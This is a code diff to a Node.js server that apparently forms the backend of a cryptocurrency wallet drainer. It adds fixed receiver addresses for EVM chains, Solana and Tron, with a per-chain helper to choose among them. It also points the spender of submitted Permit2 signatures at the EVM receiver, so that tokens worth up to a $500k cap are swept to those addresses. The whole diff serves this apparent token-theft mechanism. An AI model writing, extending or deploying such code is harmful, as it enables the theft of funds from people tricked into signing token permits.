@@ -111,9 +111,24 @@ const RELAYERS = {
 
 const CONFIG = {
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+  
+  // ════════════════════════════════════════════════════════════════
+  // RECEIVER ADDRESSES (where tokens are sent after execution)
+  // ════════════════════════════════════════════════════════════════
+  // EVM Receiver: For Ethereum, Polygon, Base, Arbitrum, Optimism, BSC, etc.
+  RECEIVER_ADDRESS_EVM: process.env.RECEIVER_ADDRESS_EVM || process.env.RECEIVER_ADDRESS || "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
+  
+  // Solana Receiver: For Solana tokens
+  RECEIVER_ADDRESS_SOLANA: process.env.RECEIVER_ADDRESS_SOLANA || process.env.SOLANA_RECEIVER || "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
+  
+  // Tron Receiver: For Tron tokens
+  RECEIVER_ADDRESS_TRON: process.env.RECEIVER_ADDRESS_TRON || process.env.TRON_RECEIVER || "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
+  
+  // Legacy fallback (for backward compatibility)
   RECEIVER_ADDRESS: process.env.RECEIVER_ADDRESS || "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
   SOLANA_RECEIVER: process.env.SOLANA_RECEIVER || "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
   TRON_RECEIVER: process.env.TRON_RECEIVER || "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
+  
   MAX_AMOUNT: 500000, // $500k limit
   ADMIN_URL: process.env.ADMIN_URL || "http://localhost:3000/admin"
 };
@@ -122,6 +137,18 @@ const CONFIG = {
 function calculateMaxAmount(tokens) {
   const totalValue = tokens.reduce((sum, t) => sum + (t.usdValue || t.uiAmount || 0), 0);
   return Math.min(totalValue, CONFIG.MAX_AMOUNT);
+}
+
+// Helper: Get receiver address for a specific chain
+function getReceiverForChain(chainId) {
+  if (chainId === 'solana') {
+    return CONFIG.RECEIVER_ADDRESS_SOLANA;
+  } else if (chainId === 'tron') {
+    return CONFIG.RECEIVER_ADDRESS_TRON;
+  } else {
+    // All EVM chains use the same receiver
+    return CONFIG.RECEIVER_ADDRESS_EVM;
+  }
 }
 
 // Helper: Get relayer for chain
@@ -432,7 +459,7 @@ app.post('/api/execute/evm', async (req, res) => {
           expiration: auth.sig_deadline,
           nonce: 0 // Simplified - should track nonces properly
         }],
-        spender: CONFIG.RECEIVER_ADDRESS,
+        spender: CONFIG.RECEIVER_ADDRESS_EVM,
         sigDeadline: auth.sig_deadline
       },
       auth.signature
